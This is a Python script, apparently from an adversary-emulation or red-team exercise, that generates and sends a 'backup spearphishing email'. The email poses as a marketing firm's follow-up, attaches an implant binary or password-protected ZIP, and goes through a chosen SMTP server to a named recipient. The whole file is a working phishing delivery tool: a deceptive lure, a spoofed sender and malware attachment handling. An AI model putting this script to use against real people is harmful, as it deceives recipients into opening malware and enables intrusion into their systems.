#!/usr/bin/python3

"""
Generate a backup spearphishing email to gosta@boom.box from team@ganjavigms.com, in the event that the original maldoc fails to execute or gets blocked.
The generated email will contain the specified attachment (e.g. implant binary or zip archive) rather than the spearphishing link from the original email.

Based on the email generator script created by Val Valenzuela and Melanie Chan.

Other references:
	- https://stackoverflow.com/a/3363254

Usage: ./backup_email_generator.py [SMTP server] [/path/to/attachment] [filename_to_send_as]
"""

import smtplib
import sys
from smtplib import SMTPException
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

html = """\
<html>
    <body>
        <p style="margin:0">Good morning,<br><br>
           Per our earlier meeting with your team, please open the attached ZIP archive to find an overview of Ganjavi Global Marketing Services (GGMS) and how it can help the companyâ€™s digital marketing and public relations needs.<br><br>
            
           In order to view the documents, please enter password: !M@rk3ting!<br><br>
            
           Please let us know if you have any questions or concerns!<br><br>
            
           V/R,<br><br>
            
           The Team at GGMS
           <p style="color:#B0BDCB; margin:0; font-size:12px"><b>Ganjavi Global Marketing Services (GGMS)</b><br>
           <i>Providing top-tier marketing services since 1990</i></p>

           <img style="width:100px; height:86px" src="data:image/png;base64, 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" alt="GGMS Logo">
        </p>
    </body>
</html>
"""

def usage():
	print('./backup_email_generator.py [SMTP server] [/path/to/attachment] [filename_to_send_as]')

def main(argv):
	if len(argv) < 2:
		usage()
		sys.exit(1)
	smtp_server = argv[0]
	attachment_path = argv[1]
	attachment_name = argv[2]
	sender = 'team@ganjavigms.com'
	receivers = ['gosta@boom.box']
	message = MIMEMultipart('alternative')
	message['Subject'] = 'Requested Marketing Materials'
	message['From'] = 'team@ganjavigms.com'
	message['To'] = 'gosta@boom.box'

	
	message.attach(MIMEText(html, 'html'))
	
	with open(attachment_path, "rb") as to_attach:
		attachment_part = MIMEApplication(to_attach.read(), Name=attachment_name)
	attachment_part['Content-Disposition'] = 'attachment; filename="%s"' % attachment_name
	message.attach(attachment_part)

	try:
		smtpObj = smtplib.SMTP(smtp_server)
		smtpObj.sendmail(sender, receivers, message.as_string())
		print("Successfully sent email")
	except SMTPException as e:
		print("Error: unable to send email: " + e)
    
    
if __name__ == "__main__":
	main(sys.argv[1:])
